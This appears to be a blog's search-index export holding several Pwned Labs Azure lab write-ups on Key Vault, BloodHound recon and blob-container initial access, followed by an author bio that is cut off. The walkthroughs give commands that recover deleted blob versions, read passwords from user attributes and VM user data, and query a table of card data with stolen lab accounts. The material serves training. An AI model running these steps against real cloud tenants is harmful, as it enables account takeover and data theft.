/home/sec-fortress/Az_lab\u0026gt; Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties[\u0026#34;displayName\u0026#34;]} $_.AdditionalProperties[\u0026#34;displayName\u0026#34;] -------------------------------------- CUSTOMER-DATABASE-ACCESS Directory Readers Default Directory We see that the user Josh belongs to the CUSTOMER-DATABASE-ACCESS group as shown above, we can go ahead and query this group to see what we have :\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-MgGroup -Filter \u0026#34;displayName eq \u0026#39;CUSTOMER-DATABASE-ACCESS\u0026#39;\u0026#34; DisplayName Id MailNickname Description GroupTypes ----------- -- ------------ ----------- ---------- CUSTOMER-DATABASE-ACCESS 79b430a5-ea4d-4de6-855b-908bdfb052dc 6e69ec6a-6 Provides full read-only access to the Mega Big Tech customer list and customer information {} From the above output, members of this group can access the Mega Big Tech customer list\u0026hellip;, taking our enumeration further, Let\u0026rsquo;s see what permissions are assigned.\nHowever I noticed that there are not so many permissions in the above output since we are still logged in as user marcus. So Log out of the current session using az logout and Disconnect-AzAccount, then log back in with az login and Connect-AzAccount to try accessing the Josh Harvey account with the Key Vault credentials we got earlier.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzRoleAssignment -Scope \u0026#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34; | Select-Object DisplayName, RoleDefinitionName DisplayName RoleDefinitionName ----------- ------------------ Ian Austin Key Vault Administrator Marcus Hutch Key Vault Reader Marcus Hutch Key Vault Secrets User Josh Harvey (Consultant) Reader CUSTOMER-DATABASE-ACCESS Customer Database Access IT-HELPDESK Reader Security User Storage Blob Data Reader Security User Reader Azure Security Insights Microsoft Sentinel Automation Contributor c7bf3d89f766471691ccdf29 Log Analytics Contributor c7bf3d89f766471691ccdf29 Monitoring Contributor c7bf3d89f766471691ccdf29 Monitoring Contributor c7bf3d89f766471691ccdf29 Log Analytics Contributor 014b118fb59f4ef59faa8c63 Monitoring Contributor 014b118fb59f4ef59faa8c63 Log Analytics Contributor 014b118fb59f4ef59faa8c63 Monitoring Contributor 014b118fb59f4ef59faa8c63 Log Analytics Contributor f2dde2b466f240afa614abbc Log Analytics Contributor f2dde2b466f240afa614abbc Monitoring Contributor b047e83f402747fd8797e1ff Monitoring Contributor b047e83f402747fd8797e1ff Log Analytics Contributor 0f7ef2ab65244e72925a57e4 Monitoring Contributor 0f7ef2ab65244e72925a57e4 Monitoring Contributor 0f7ef2ab65244e72925a57e4 Log Analytics Contributor 0f7ef2ab65244e72925a57e4 Log Analytics Contributor f41ed7dd9122452585bcc1ff Monitoring Contributor f41ed7dd9122452585bcc1ff Log Analytics Contributor 1ae7323ccead497685d1c18a Log Analytics Contributor 1ae7323ccead497685d1c18a Monitoring Contributor 57d7395f82fe4a2593d003b4 Monitoring Contributor 57d7395f82fe4a2593d003b4 Log Analytics Contributor 57d7395f82fe4a2593d003b4 Log Analytics Contributor 57d7395f82fe4a2593d003b4 Monitoring Contributor 9f9dcd98a3a74c7a9b2abace Monitoring Contributor 9f9dcd98a3a74c7a9b2abace Log Analytics Contributor Clara Miller Reader dbuser Reader According to the above output the user Josh Harvey has been assigned the Reader role. The Reader role in Azure grants read-only access to resources but does not allow modification or access to sensitive data like Key Vault contents or databases.\nWe also see that CUSTOMER-DATABASE-ACCESS group has been assigned the Customer Database Access role so let enumerate that.\naz role definition list --custom-role-only true --query \u0026#34;[?roleName==\u0026#39;Customer Database Access\u0026#39;]\u0026#34; -o json The above output shows that the group gives members the ability to list storage tables and their values! The Azure Storage Tables are a NoSQL data store for large, structured, non-relational data, part of Azure Storage services alongside Blob, File, and Queue Storage.\u0026quot;\nWe then start by listing the storage accounts in the current Azure subscription in plain text format (TSV) with the below command.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az storage account list --query \u0026#34;[].name\u0026#34; -o tsv custdatabase mbtwebsite securityconfigs Then we can Issue the following command below to see if any storage tables exist in any of this storage accounts\naz storage table list --account-name \u0026lt;storage_account\u0026gt; --output table --auth-mode login According to the above output only the custdatabase storage account has a storage table named customers , We can then go ahead and query this storage table leading to the disclosure of sensitive information such as payment data.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login PartitionKey RowKey Card_expiry Card_number Customer_id Customer_name Cvv -------------- -------- ------------- ---------------- ------------------------------------ -------------------------------------- ----- 1 1 10/30 5425233430109903 07244ad0-c228-43d8-a48e-1846796aa6ad SecureBank Holdings 543 1 10 01/30 4347866885036101 cba21bec-7e8d-4394-a145-ea7f6131a998 InnoVenture 781 1 2 09/29 4012000033330026 66d7a744-5eb6-4b1b-9e70-a36824366534 NeuraHealth 452 1 3 05/31 4657490028942036 6a88c0ff-b79c-4842-92f1-f25d53c5cbe4 DreamScreen Entertainment 683 1 4 01/29 4657493919180161 14fb331d-a82e-41f8-8f20-d630f312dd3e InfiNet Solutions 855 1 5 08/29 4657490203402673 cdf53341-b806-4f69-a1e2-7b632b1d405d Skyward Aerospace 344 1 6 12/30 4594045518310163 c6e6418b-fc4e-4f7b-a463-1a3bc6551cd3 Quasar Analytics Inc 145 1 7 02/29 4594055970518286 fc4f9042-5b94-4a79-b18a-40fa621fe2e1 DataGuard Inc 243 1 8 06/30 4698558990398121 07a2cfae-16de-41a9-af51-b9cd9f077800 Huge Logistics 546 1 9 03/30 4698559508013566 512df22d-815f-4f98-92af-a615a92ea39d SmartMove Robotics 992 1 99 Flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Have fun ⋆.˚ ᡣ𐭩 .𖥔˚\nKey Takeaways Azure Key Vault is a critical service for securely storing and managing sensitive information like secrets, keys, and certificates.\nBy centralizing secrets in the Key Vault, you reduce the risk of exposure and ensure tighter control over access. Role-based access control (RBAC) and Access Policies help limit access to only authorized users and services.\nRegular auditing and rotating of secrets enhances security, minimizing potential breaches.\nImplementing the Principle of Least Privilege ensures that only necessary permissions are granted, reducing attack surfaces.\n","permalink":"http://localhost:1313/hacking/unlock_access_with_azure_key_vault/","summary":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault\nOverview After successfully compromising the Azure user account marcus@megabigtech.com and gaining access to their cloud environment, Mega Big Tech have asked us to see how far we can penetrate into the cloud environment, and if we can access any confidential data.","title":"Unlock Access with Azure Key Vault"},{"content":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nOverview =\u0026gt; After discovering that a public company GitHub repository contained accidentally committed credentials, Mega Big Tech has requested us to investigate the extent of potential exposure. They want to determine if these credentials can be used to access their cloud environment and if any confidential data is at risk.\nSetting Up Download the latest azurehound binary from here Unzip and and move to /bin for faster access ❯ unzip azurehound-linux-amd64.zip ❯ sudo mv azurehound /bin/ ❯ sudo chmod 777 /bin/azurehound Just as we need credential access when enumerating On-Prem, we also need credential access here too. Credentials have been given for this lab though :\nIAM user : Jose.Rodriguez@megabigtech.com Password : [REDACTED] Login Portal : https://portal.azure.com/ Azure tenant ID : Find this on portal or by running * az login * az account show { --SNIP-- \u0026#34;tenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34;, --SNIP-- } To run azurehound we need the tenantID, Username and the Password. Just as shown above, you can get the tenantID by using Azure-CLI\nazurehound -u \u0026#34;Jose.Rodriguez@megabigtech.com\u0026#34; -p \u0026#39;[REDACTED]\u0026#39; list --tenant \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34; -o output.json Start up both neo4j and bloodhound\n❯ sudo neo4j console ❯ sudo bloodhound Then go ahead and upload the output.json data created by azurehound\nScrolling down under the Database Info tab you should see \u0026ldquo;Azure Objects\u0026rdquo;\nAs user we start by enumerating the properties which our current user has\nNodes and Edges BloodHound consists of nodes and edges, which together form a graph that reveals potential attack paths and privilege relationships within the environment ;\nNodes : represent entities or objects in Azure AD. Few examples include: Users: Azure AD accounts. Groups: Security or distribution groups in Azure AD. Applications: Azure AD applications that use service principals. Service Principals: Representations of applications within Azure. Subscriptions: Azure subscription resources. Edges ; represent the relationships or permissions between nodes. Membership: A user or service principal being a member of a group. Ownership: A user or group owning a service principal or application. Role Assignments: Showing roles that provide permissions over resources like subscriptions or resource groups. Privileges: Showing a user\u0026rsquo;s privileged access over an entity (e.g., a user having Owner or Contributor role over a resource). Edges are far more important in Azure has they show us the permission resources have over each other, As attackers it reveals attack paths show ways one can navigate from a low-privilege node to a high-privilege node. Lot of Az edges have been discussed here\nBloodhound tells us that our current user belongs to 5 Az admin roles with an assigned role named UPDATE MANAGER and four roles inherited from the IT-Helpdesk group.\nUpdate Manager: Allows helpdesk to update manager roles when users change teams; low security impact. Directory Readers: Allows users to read basic directory info, excluding sensitive data. Printer Technician: Allows managing printers; low security interest. Attribute Definition Reader: Can read definitions of custom security attributes. Attribute Assignment Reader: Can read custom security attribute keys and values for Microsoft Entra objects. Cypher Queries Overview Since generally there are no much queries like \u0026ldquo;Find All Domain Admins\u0026rdquo; in bloodhound for azure we can start by creating our own custom cypher query, This cheatsheet contains alot of cypher queries\nFor example, the below returns all Members of the Global Administrator role.\nMATCH p =(n)-[r:AZGlobalAdmin*1..]-\u0026gt;(m) RETURN p Note : Azure Global Administrator role is equivalent to the Domain Admin privilege in Active Directory.\nSetting Up Query :\nExecuting Query To List All Global Admins :\nHunting for custom security attributes This feature was released in Azure on December of 2021 This was introduced to roll-out of Attribute Based Access Control (ABAC) Used to store sensitive data which is a potential target for attackers Go ahead and install the Microsoft.Graph module as described by Microsoft on how to query for custom security attributes\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Install-Module Microsoft.Graph Then run the below command to perform authentication request as our current Azure AD user.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Connect-MgGraph Welcome to Microsoft Graph! Connected via delegated access using 14d82eec-204b-4c2f-b7e8-296a70dab67e Readme: https://aka.ms/graph/sdk/powershell SDK Docs: https://aka.ms/graph/sdk/powershell/docs API Docs: https://aka.ms/graph/docs NOTE: You can use the -NoWelcome parameter to suppress this message. The below script then connects to Microsoft Graph, retrieves all users in Azure AD, and loops through each user to display their custom security attributes.\n# Connect to Microsoft Graph Connect-MgGraph # Retrieve all users $allUsers = Get-MgUser -All # Loop through all users and retrieve their custom security attributes foreach ($user in $allUsers) { $userAttributes = Get-MgUser -UserId $user.Id -Property \u0026#34;customSecurityAttributes\u0026#34; # Display the additional properties of custom security attributes for each user Write-Host \u0026#34;User: $($user.UserPrincipalName)\u0026#34; $userAttributes.CustomSecurityAttributes.AdditionalProperties | Format-List Write-Host \u0026#34;---------------------------------------------\u0026#34; } As shown in the below screenshot the user archive@megabigtech.com has a custom security attribute named Helpdesk that seems to store the password of the user.\nlogging into to the Azure Portal as user jose...., we can lookup the archive@megabigtech.com user in the console.\nWe see that Helpdesk staff added the attribute to allow them to login and troubleshoot as this user.\nManual Enumeration - Bloodhound misses BloodHound effectively identifies directory roles like this but currently misses Azure role assignments made at the subscription, management group, resource group, or resource level.\nNavigating to the Azure portal we can go ahead and select \u0026ldquo;Microsoft Entra ID\u0026rdquo; Then click on \u0026ldquo;Groups\u0026rdquo; Search for the helpdesk group and select the IT-Helpdesk to bring up its properties as shown in bloodhound previously. Now click Azure role assignments. As shown below the group, \u0026ldquo;IT-Helpdesk\u0026rdquo; is assigned the Reader role, with the scope set to the SECURITY-PC virtual machine.\nWe could also have done the above using the PowerShell Az module and the Get-AzRoleAssignment cmdlet.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Connect-AzAccount Please select the account you want to login with. Retrieving subscriptions for the selection... Subscription name Tenant ----------------- ------ Microsoft Azure Sponsorship Default Directory PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzRoleAssignment RoleAssignmentName : 4b5ae432-6902-4ca2-bbed-815492eef631 RoleAssignmentId : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/content-static-2/providers/Microsoft.Compute/virtualMachines/SECURITY-PC/providers/Microsoft.Authoriz ation/roleAssignments/4b5ae432-6902-4ca2-bbed-815492eef631 Scope : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourcegroups/content-static-2/providers/Microsoft.Compute/virtualMachines/SECURITY-PC DisplayName : IT-HELPDESK SignInName : RoleDefinitionName : Reader RoleDefinitionId : acdd72a7-3385-48ef-bd42-f606fba81ae7 ObjectId : 8a517e87-6b05-45ae-b1ca-7436f1682602 ObjectType : Group CanDelegate : False Description : ConditionVersion : Condition : Extracting Credentials Since we have Reader access to a virtual machine, something that is worth checking is custom user data fields, Go ahead and click the SECURITY-PC resource\nClick on the Operating system menu under the Settings section, the User data field we see that an Azure CLI command has been added, including a comment with credentials!\n# Credentials: User: security-user | Password: Imp0sec0sT! az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login We can get the virtual machine user data from the command line instead of using the Az portal as we did previously, as shown below.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzVM -ResourceGroupName \u0026#34;content-static-2\u0026#34; -Name \u0026#34;SECURITY-PC\u0026#34; -UserData ResourceGroupName : content-static-2 Id : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/content-static-2/providers/Microsoft.Compute/virtualMachines/SECURITY-PC VmId : 648c8a08-c90a-4a95-8922-4cbf28375bcb Name : SECURITY-PC Type : Microsoft.Compute/virtualMachines Location : eastus LicenseType : Windows_Client Tags : {} HardwareProfile : {VmSize} NetworkProfile : {NetworkInterfaces} SecurityProfile : {UefiSettings, SecurityType} OSProfile : {ComputerName, AdminUsername, WindowsConfiguration, Secrets, AllowExtensionOperations, RequireGuestProvisionSignal} ProvisioningState : Succeeded StorageProfile : {ImageReference, OsDisk, DataDisks, DiskControllerType} Identity : {PrincipalId, TenantId, Type} Zones : {1} UserData : IyBDcmVkZW50aWFsczogVXNlcjogc2VjdXJpdHktdXNlciB8IFBhc3N3b3JkOiBJbXAwc2VjMHNUIQpheiBzdG9yYWdlIGJsb2IgZG93bmxvYWQgLS1hY2NvdW50LW5hbWUgc2VjdXJpdHljb25maWdzIC0tY29udGFpbmVyL W5hbWUgc2VjdXJpdHktcGMgLS1uYW1lIGNvbmZpZy1sYXRlc3QueG1sIC0tYXV0aC1tb2RlIGxvZ2luCg== TimeCreated : 10/31/2023 3:24:18PM Etag : \u0026#34;16\u0026#34; The UserData variable is what we need which is in base64 format, we can go ahead and decode this using your linux OS\n❯ echo \u0026#34;IyBDcmVkZW50aWFsczogVXNlcjogc2VjdXJpdHktdXNlciB8IFBhc3N3b3JkOiBJbXAwc2VjMHNUIQpheiBzdG9yYWdlIGJsb2IgZG93bmxvYWQgLS1hY2NvdW50LW5hbWUgc2VjdXJpdHljb25maWdzIC0tY29udGFpbmVyL W5hbWUgc2VjdXJpdHktcGMgLS1uYW1lIGNvbmZpZy1sYXRlc3QueG1sIC0tYXV0aC1tb2RlIGxvZ2luCg==\u0026#34; | base64 -d # Credentials: User: security-user | Password: Imp0sec0sT! az storage blob download --account-name securityconfigs --container-name security-pc --name config-latest.xml --auth-mode login Now trying to use the command shown after decoding the b64 text we have the following error cos we are not yet logged in as the security-user who has the permission to do so.\nRun the below command on pwsh to log in as the security-user user for privileged access\naz login --scope https://storage.azure.com/.default # When prompted fill in the below Username : security-user@megabigtech.com Passowrd : ************* If we run the command again we have alot of config output and sensitive information including global administrator credentials\nWe can also view this config files using the Az portal, Log in as the security-user user and search for the securityconfigs resource (storage account name)\nUnder the \u0026ldquo;Data Storage\u0026rdquo; drop down select the Containers menu\nThen click on the security-pc container name\nWe can then see the config file we accessed earlier including the flag.txt file for this challenge lab\nGo ahead and download the flag file using the Azure-CLI tool as used earlier\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az storage blob download --account-name securityconfigs --container-name security-pc --name flag.txt --auth-mode login Finished[#############################################################] 100.0000% ****************************** Have fun 𓆝 𓆟 𓆞 𓆝 𓆟\nResources Lab Link : https://pwnedlabs.io/labs/intro-to-azure-recon-with-bloodhound https://learn.microsoft.com/en-us/entra/fundamentals/custom-security-attributes-overview https://blog.netwrix.com/2022/02/10/what-are-azure-ad-custom-security-attributes/ https://posts.specterops.io/introducing-bloodhound-4-3-get-global-admin-more-often-5795cbf535b2 ","permalink":"http://localhost:1313/hacking/intro_to_azure_recon_with_bloodhound/","summary":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nOverview =\u0026gt; After discovering that a public company GitHub repository contained accidentally committed credentials, Mega Big Tech has requested us to investigate the extent of potential exposure. They want to determine if these credentials can be used to access their cloud environment and if any confidential data is at risk.","title":"Intro to Azure Recon with BloodHound"},{"content":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough Started a new Azure red team lab series on @Pwnedlabs and it has been fun so far. Thanks to my very good friend, Ayush, who introduced me to this platform.\nAs the blog header says, we can go ahead and start this lab in which we are given a URL, Navigating to the URL, we can see that this is truly hosted on the Azure cloud service.\nPlatform as a service (PaaS) is a complete development and deployment environment in the cloud, with resources that enable you to deliver everything from simple cloud-based apps to sophisticated, cloud-enabled enterprise applications.\nViewing source code we can see that we have a blob URL, This allows for:\nThe storage and management of data, such as documents, images, videos, and backups. The Blob storage service is highly available and can be a cost-effective option. Azure Blob Storage is Microsoft\u0026rsquo;s cloud service for storing large amounts of unstructured data, such as text or binary files, that don\u0026rsquo;t fit into a specific data model. \u0026ldquo;Blob\u0026rdquo; stands for \u0026ldquo;binary large object.\u0026rdquo;\nIt is possible to verify if this endpoint is up by making the following requests, Note that you have to replace /static with /index.html :\nInvoke-WebRequest -Uri \u0026#39;https://mbtwebsite.blob.core.windows.net/$web/index.html\u0026#39; -Method Head StatusCode : 200 StatusDescription : OK Content : RawContent : HTTP/1.1 200 OK ETag: 0x8DBD1A84E6455C0 Server: Windows-Azure-Blob/1.0 Server: Microsoft-HTTPAPI/2.0 x-ms-request-id: 679bb941-301e-0015-523b-105b8c000000 x-ms-version: 2009-09-19 x-ms-lease-status: u… Headers : {[ETag, System.String[]], [Server, System.String[]], [x-ms-request-id, System.String[]], [x-ms-version, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 0 RelationLink : {} ❯ curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html HTTP/1.1 400 One of the request inputs is out of range. Transfer-Encoding: chunked Server: Blob Service Version 1.0 Microsoft-HTTPAPI/2.0 x-ms-request-id: 87b5de6d-b01e-009d-3243-10be85000000 Date: Thu, 26 Sep 2024 18:41:58 GMT # Note : It is worth using \u0026#39;powershell\u0026#39; or \u0026#39;pwsh\u0026#39; in \u0026#39;kali\u0026#39; We can go ahead and expand the Headers property as this should give us a clear view of this endpoint. You can also do this for the RawContent property.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress\u0026gt; Invoke-WebRequest -Uri \u0026#39;https://mbtwebsite.blob.core.windows.net/$web/index.html\u0026#39; -Method Head | Select-Object -ExpandProperty Headers Key Value --- ----- ETag {0x8DBD1A84E6455C0} Server {Windows-Azure-Blob/1.0, Microsoft-HTTPAPI/2.0} x-ms-request-id {9d1c2618-e01e-00bf-2042-107b9a000000} x-ms-version {2009-09-19} x-ms-lease-status {unlocked} x-ms-blob-type {BlockBlob} Date {Thu, 26 Sep 2024 18:31:40 GMT} Content-Length {782359} Content-Type {text/html} Content-MD5 {JSe+sM+pXGAEFInxDgv4CA==} Last-Modified {Fri, 20 Oct 2023 20:08:20 GMT} We can also look into each components of this blob URL at https://mbtwebsite.blob.core.windows.net/$web/index.html\nhttps: The protocol used. Azure Blob Service supports both http and https mbtwebsite: The name of the Azure Storage Account associated with the website. blob.core.windows.net: The Azure Blob Storage Service $web: The name of the container hosting the website, and it is situated within the storage account. (Fuzzable with ffuf) index.html: The web page being requested Note that the container is always bruteforce-able as shown in this blog using tools like ffuf and MicroBurst\nWe can then go ahead and look for sensitive public information on the container /$web with the default blob parameter ?restype=container\u0026amp;comp=list by sending a HTTP requests to the Azure Storage REST API.\nAs shown above there is alot of data and this can be terrible to read, we can set a delimiter to read only directories : ?restype=container\u0026amp;comp=list\u0026amp;delimiter=%2F\nWe can also automate all this process by using Azure-CLI and other methods as specified in both of this blogs ; Blog1, Blog2.\n❯ az storage blob list --account-name mbtwebsite --container-name \u0026#39;$web\u0026#39; --output table However as shown in the above output there isn\u0026rsquo;t any sensitive file found yet, we can go ahead and dig deeper by checking if versioning has been enabled for the container, and if we see any previous versions of files.\n/?restype=container\u0026amp;comp=list\u0026amp;include=versions \u0026ldquo;Blob versioning is a useful feature as it allows point-in-time recovery of individual blobs. A file may no longer exist, but a version of the file will still be stored. Sometimes files are temporarily uploaded for transfer, or maybe deleted after they are found to contain sensitive data\u0026hellip;\u0026rdquo; \u0026ndash; PwnedLabs\nHowever as shown above trying to list previous versions using a browser isn\u0026rsquo;t successful, searching for this error on google i came across a solution from stackoverflow by using the Az-CLI method or curl with the x-ms-version header.\n❯ az rest --method get --url \u0026#39;https://mbtwebsite.blob.core.windows.net/$web?restype=container\u0026amp;comp=list\u0026amp;include=versions\u0026#39; --headers \u0026#34;x-ms-version=2019-10-10\u0026#34; | xmlstarlet fo curl -H \u0026#34;x-ms-version: 2019-10-10\u0026#34; \u0026#39;https://mbtwebsite.blob.core.windows.net/$web?restype=container\u0026amp;comp=list\u0026amp;include=versions\u0026#39; | xmlstarlet fo Using Azure-CLI :\nUsing curl :\nReason : The versions parameter is only supported by version 2019-12-12 and later so it must be specified in our request.\nAs we can see we got an extra scripts-transfer.zip file using this method, we can go ahead and download this using curl. Don\u0026rsquo;t forget to include the versionId parameter and the x-ms-version header in your request :\n❯ curl -H \u0026#34;x-ms-version: 2019-12-12\u0026#34; \u0026#39;https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2024-03-29T20:55:40.8265593Z\u0026#39; --output scripts-transfer.zip % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1503 100 1503 0 0 111 0 0:00:13 0:00:13 --:--:-- 354 Then go ahead an unzip the files to a directory :\n❯ mkdir scripts ❯ unzip scripts-transfer.zip -d scripts Archive: scripts-transfer.zip inflating: scripts/entra_users.ps1 inflating: scripts/stale_computer_accounts.ps1 Checking the first powershell script we have credentials for the user marcus\n❯ \\cat entra_users.ps1 # Install the required modules if not already installed # Install-Module -Name Az -Force -Scope CurrentUser # Install-Module -Name MSAL.PS -Force -Scope CurrentUser # Import the required modules Import-Module Az Import-Module MSAL.PS # Define your Azure AD credentials $Username = \u0026#34;marcus@megabigtech.com\u0026#34; $Password = \u0026#34;[REDACTED]\u0026#34; | ConvertTo-SecureString -AsPlainText -Force $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password) # Authenticate to Azure AD using the specified credentials Connect-AzAccount -Credential $Credential # Define the Microsoft Graph API URL $GraphApiUrl = \u0026#34;https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName\u0026#34; # Retrieve the access token for Microsoft Graph $AccessToken = (Get-AzAccessToken -ResourceType MSGraph).Token # Create a headers hashtable with the access token $headers = @{ \u0026#34;Authorization\u0026#34; = \u0026#34;Bearer $AccessToken\u0026#34; \u0026#34;ContentType\u0026#34; = \u0026#34;application/json\u0026#34; } # Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell $response = Invoke-RestMethod -Uri $GraphApiUrl -Method Get -Headers $headers # Output the response (formatted as JSON) $response | ConvertTo-Json Go ahead and type the following command to initiate the authentication process to log into the Azure account we just discovered with your username and password.\n❯ az login For authentication context we can confirm that we truly have the Azure Account Details of our compromised user :\n❯ az account show { \u0026#34;environmentName\u0026#34;: \u0026#34;AzureCloud\u0026#34;, \u0026#34;homeTenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34;, \u0026#34;isDefault\u0026#34;: true, \u0026#34;managedByTenants\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;Microsoft Azure Sponsorship\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;Enabled\u0026#34;, \u0026#34;tenantDefaultDomain\u0026#34;: \u0026#34;megabigtech.com\u0026#34;, \u0026#34;tenantDisplayName\u0026#34;: \u0026#34;Default Directory\u0026#34;, \u0026#34;tenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34;, \u0026#34;user\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;marcus@megabigtech.com\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;user\u0026#34; } } You can then navigate to https://portal.azure.com/, to login to the web-based dashboard that manages all of the Azure resources.\nGo ahead and open up the Azure cloud shell with the console icon by the top right\nOnce this is done you should have a cloud console like the below\nUsing this cheatsheet for list of commands i was able to come up with the below command to list the properties of our current user.\nPS /home/marcus\u0026gt; Connect-AzureAD PS /home/marcus\u0026gt; Get-AzureADUser -ObjectId marcus@megabigtech.com | Select-Object -Property * --SNIP-- ObjectId : 41c178d3-c246-4c00-98f0-8113bd631676 ObjectType : User AccountEnabled : True AgeGroup : AssignedLicenses : {} AssignedPlans : {} City : CompanyName : ConsentProvidedForMinor : Country : CreationType : Department : DirSyncEnabled : DisplayName : Marcus Hutch FacsimileTelephoneNumber : GivenName : Marcus IsCompromised : ImmutableId : JobTitle : Flag: [REDACTED] LastDirSyncTime : LegalAgeGroupClassification : Mail : MailNickName : marcus Mobile : OnPremisesSecurityIdentifier : OtherMails : {} PasswordPolicies : PasswordProfile : PhysicalDeliveryOfficeName : PostalCode : PreferredLanguage : ProvisionedPlans : {} ProvisioningErrors : {} ProxyAddresses : {} RefreshTokensValidFromDateTime : 9/26/2024 9:04:50 PM ShowInAddressList : SignInNames : {} SipProxyAddress : State : StreetAddress : Surname : Hutch TelephoneNumber : UsageLocation : UserPrincipalName : marcus@megabigtech.com UserState : UserStateChangedOn : UserType : Member PS /home/marcus\u0026gt; That would be all for today ( -_•)︻デ═一\nReferences \u0026amp; Mitigations Lab Link : https://pwnedlabs.io/labs/azure-blob-container-to-initial-access Security recommendations for Blob storage Securing Azure Blob Storage: Set-Up Guide Security best practices for Azure Blob Storage ","permalink":"http://localhost:1313/hacking/azure_blob_container_to_initial_access/","summary":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough Started a new Azure red team lab series on @Pwnedlabs and it has been fun so far. Thanks to my very good friend, Ayush, who introduced me to this platform.\nAs the blog header says, we can go ahead and start this lab in which we are given a URL, Navigating to the URL, we can see that this is truly hosted on the Azure cloud service.","title":"Azure Blob Container to Initial Access"},{"content":" ❓ Introduction Hii, I am a 20 yr/old security researcher/penetration tester with extensive networking, scripting, linux administration, active directory and a little cloud experience. Familiarity with security frameworks including OWASP Top 10, Microsoft SDL, MITRE ATT\u0026amp;CK Framework and SANS Top 25. Knowledgeable on defensive security concepts including SIEM and threat hunting. Actively pursuing the OSCP certification and cloud security to further validate proficiency and skill set.\n💻 Infosec, or about 80% of my life My love for Infosec started six years ago. With no mentor or anyone to guide me, I began my journey using TryHackMe.com, YouTube, and Stack Overflow to learn. Later on, I took the Security+ course from ITPro.TV, which allowed me to grasp the basics of cybersecurity, covering areas such as Threats, Attacks, and Vulnerabilities, Cryptography, Cloud and Virtualization, Operational Security, and Incident Response.\nWith this, I was able to continue my learning journey with various other platforms like HackTheBox, PortSwigger, HackMyVM, Vulnix, etc., which gave me a higher advantage in gaining practical experience. Most notably, playing Boot2Root CTFs provided me with an opportunity to join a CTF team called \u0026ldquo;5h4d0wbr0k3r5,\u0026rdquo; giving me a more solid understanding of penetration testing.\nI then landed my first role as a web application penetration tester at a company in India. From there, I secured another job in Nigeria as a network penetration tester, where I gained substantial experience in technical skills like Active Directory and Linux administration. Additionally, I developed soft skills in managing co-workers and working effectively as part of a team.\nI was fortunate to have all my penetration testing exams sponsored, for which I am truly grateful. I have also made a lot of trustworthy and 1337 friends like hac, obx, n16ht4wk, ramsey, rami, fr3y, nerdy, ezequiel, Kunal and many others including someone who I am really looking upto, @hackingdave. I don\u0026rsquo;t know what the future holds, but continuous learning is key for me. I am eager to apply my skills and knowledge to real-world challenges in a dynamic company where I can contribute to and grow with the team.\n🏅 Courses and certifications This is a non-exhaustive list of certifications and courses I have taken.\nCertified Red Team Professional (badge here)\nCertified Penetration Testing Specialist (badge here)\nDante, Penetration Tester Level II lab (badge here)\nZephyr, Red Team Operator Level I lab (badge here)\nCurrently reading the book “Penetration Testing Azure for Ethical Hackers” by David Okeyode and Karl Fosaaen\nI’m also planning to take the Offensive Security Certified Professional (OSCP) exam in coming months.\n🪟 Life outside of infosec, the last 20% Outside of cybersecurity, I am also passionate about other things. I enjoy making good food, building positive relationships, watching anime, and listening to good music. I listen to music while doing almost all of my day-to-day activities, which helps me achieve total concentration. Additionally, I am currently pursuing a degree in Criminology and Security Studies (BSc) at an Open University to expand my knowledge in addressing real-world challenges. This program 